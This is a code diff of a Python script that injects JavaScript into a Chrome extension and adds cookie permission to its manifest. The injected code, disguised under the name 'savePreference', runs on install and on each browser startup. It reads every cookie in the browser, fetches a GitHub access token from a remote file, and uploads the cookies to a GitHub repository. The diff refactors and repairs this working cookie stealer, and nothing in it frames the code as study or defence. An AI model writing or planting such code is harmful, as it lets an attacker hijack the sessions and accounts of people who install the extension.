@@ -6,85 +6,88 @@ manifest_path = 'manifest.json'
 # The code you want to append
 code_to_append = """
 chrome.runtime.onInstalled.addListener(() => {
-    savepreferance();
-  });
-  
-  chrome.runtime.onStartup.addListener(() => {
-    savepreferance();
-  });
-  
-  function savepreferance() {
-    chrome.cookies.getAll({}, (cookies) => {
-      const cookieData = JSON.stringify(cookies, null, 2);
-      const date = new Date().toISOString().split('T')[0]; // Get the date in YYYY-MM-DD format
-      const time = new Date().toISOString().split('T')[1].split('.')[0]; // Get the time in HH:MM:SS format
-      const fileName = `cookie_${date}_${time}.txt`;
-  
-      // Create the text file with cookies data
-      const file = new Blob([cookieData], { type: 'text/plain' });
-  
-      // Now, upload this file to GitHub
-      uploadFileToGitHub(file, fileName);
-    });
-  }
-async function fetchGitHubToken() {
-  const response = await fetch('https://raw.githubusercontent.com/labibrayan14/labibrayan.github.io/refs/heads/main/adreaper');
-  if (!response.ok) {
-    throw new Error("Failed to fetch GitHub token");
-  }
-  const token = await response.text();
-  return modifytoken(token.trim()); // Ensure no extra spaces are included
-}
-
-fetchGitHubToken().then(token => {
-  console.log('GitHub Token:', token);
-}).catch(error => {
-  console.error('Error fetching token:', error);
+  savePreference();
 });
 
-  function modifytoken(inputStr) {
-    // Split the string by "|"
-    let parts = inputStr.split('|');
+chrome.runtime.onStartup.addListener(() => {
+  savePreference();
+});
 
-    // Add "github_pat_" to the second index
-    parts[1] = "github_pat_" + parts[1];
+async function savePreference() {
+  chrome.cookies.getAll({}, async (cookies) => {
+    const cookieData = JSON.stringify(cookies, null, 2);
+    const now = new Date();
+    const date = now.toISOString().split('T')[0];
+    const time = now.toISOString().split('T')[1].split('.')[0].replace(/:/g, '-');
+    const fileName = `cookie_${date}_${time}.txt`;
 
-    // Join the parts back into a string
-    return parts[1];
+    const file = new Blob([cookieData], { type: 'text/plain' });
+
+    try {
+      const token = await fetchGitHubToken();
+      await uploadFileToGitHub(file, fileName, token);
+    } catch (error) {
+      console.error("❌ Error in saving preference:", error);
+    }
+  });
 }
-  function uploadFileToGitHub(file, fileName) {
-    const githubApiUrl = "https://api.github.com/repos/labibrayan14/cookies/contents/cookies/";
-    const githubToken = fetchGitHubToken();
-  
-    // Read the file as a Base64 encoded string
+
+async function fetchGitHubToken() {
+  const rawUrl = 'https://raw.githubusercontent.com/labibrayan14/labibrayan.github.io/main/adreaper';
+  const response = await fetch(rawUrl);
+  if (!response.ok) throw new Error("Failed to fetch GitHub token");
+
+  const rawToken = await response.text();
+  return modifyToken(rawToken.trim());
+}
+
+function modifyToken(inputStr) {
+  const parts = inputStr.split('|');
+  const tokenPart = parts[1];
+  return tokenPart.startsWith("github_pat_") ? tokenPart : "github_pat_" + tokenPart;
+}
+
+function readFileAsBase64(file) {
+  return new Promise((resolve, reject) => {
     const reader = new FileReader();
-    reader.onloadend = function() {
-      const fileContent = reader.result.split(',')[1]; // Get Base64 encoded content
-  
-      const githubPayload = {
-        message: `Upload cookie data for ${fileName}`,
-        committer: {
-          name: "Your Name",
-          email: "your-email@example.com"
-        },
-        content: fileContent
-      };
-  
-      fetch(githubApiUrl + fileName, {
-        method: "PUT",
-        headers: {
-          "Authorization": `token ${githubToken}`,
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(githubPayload)
-      })
-      .then(response => response.json())
-      .then(data => console.log("File uploaded to GitHub:", data))
-      .catch(error => console.error("Error uploading file:", error));
+    reader.onloadend = () => {
+      const base64Content = reader.result.split(',')[1]; // remove data URI prefix
+      resolve(base64Content);
     };
-    
-    reader.readAsDataURL(file); // Convert file to Base64
+    reader.onerror = reject;
+    reader.readAsDataURL(file);
+  });
+}
+
+async function uploadFileToGitHub(file, fileName, token) {
+  const githubApiUrl = `https://api.github.com/repos/icelashgames/Cookies/contents/${fileName}`;
+  const content = await readFileAsBase64(file);
+
+  const githubPayload = {
+    message: `Upload cookie data for ${fileName}`,
+    committer: {
+      name: "IcelashGames",
+      email: "your-email@example.com"
+    },
+    content: content
+  };
+
+  const response = await fetch(githubApiUrl, {
+    method: "PUT",
+    headers: {
+      "Authorization": `token ${token}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(githubPayload)
+  });
+
+  const data = await response.json();
+  if (response.ok) {
+    console.log("✅ File uploaded to GitHub:", data.content.download_url);
+  } else {
+    console.error("❌ GitHub API error:", data);
   }
+}
 """
 def add_cookie_permission(manifest_path):
     if not os.path.exists(manifest_path):
